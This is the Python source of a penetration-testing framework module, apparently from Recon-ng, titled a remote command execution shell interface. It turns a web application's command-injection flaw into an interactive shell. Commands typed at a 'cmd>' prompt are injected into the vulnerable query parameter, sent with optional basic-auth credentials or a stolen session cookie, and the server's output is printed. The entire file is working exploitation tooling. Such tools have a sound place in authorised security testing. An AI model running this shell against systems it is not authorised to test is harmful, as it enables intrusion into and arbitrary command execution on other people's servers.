import framework
# unique to module
import urlparse

class Module(framework.module):

    def __init__(self, params):
        framework.module.__init__(self, params)
        self.register_option('base_url', None, 'yes', 'the target resource url excluding any parameters')
        self.register_option('parameters', None, 'yes', 'the query parameters with \'%s\' signifying the value of the vulnerable parameter')
        self.register_option('basic_user', None, 'no', 'username for basic authentication')
        self.register_option('basic_pass', None, 'no', 'password for basic authentication')
        self.register_option('cookie', None, 'no', 'cookie string containing authenticated session data')
        self.register_option('post', False, 'yes', 'set the request method to post. parameters should still be submitted in the url option')
        self.info = {
                     'Name': 'Remote Commnd Execution Shell Interface',
                     'Author': 'Tim Tomes (@LaNMaSteR53)',
                     'Description': 'Provides a shell interface for remote command execution flaws in web applications.',
                     'Comments': []
                     }

    def module_run(self):
        base_url = self.options['base_url']['value']
        params = self.options['parameters']['value']
        username = self.options['basic_user']['value']
        password = self.options['basic_pass']['value']
        cookie = self.options['cookie']['value']

        # process authentication
        auth = (username, password) if username and password else ()
        headers = {'Cookie': cookie} if cookie else {}

        # set the request method
        method = 'POST' if self.options['post']['value'] else 'GET'

        print 'Type \'exit\' to quit.'
        while True:
            # get command from the terminal
            cmd = raw_input("cmd> ")
            if cmd.lower() == 'exit': return
            # build the payload from the params string
            payload = {}
            for param in urlparse.parse_qsl(params % (cmd)):
                payload[param[0]] = param[1]
            # send the request
            try: resp = self.request(base_url, method=method, payload=payload, headers=headers, auth=auth)
            except KeyboardInterrupt:
                print ''
                return
            except Exception as e:
                self.error(e.__str__())
                return
            # process the response
            print '%s' % (resp.text)
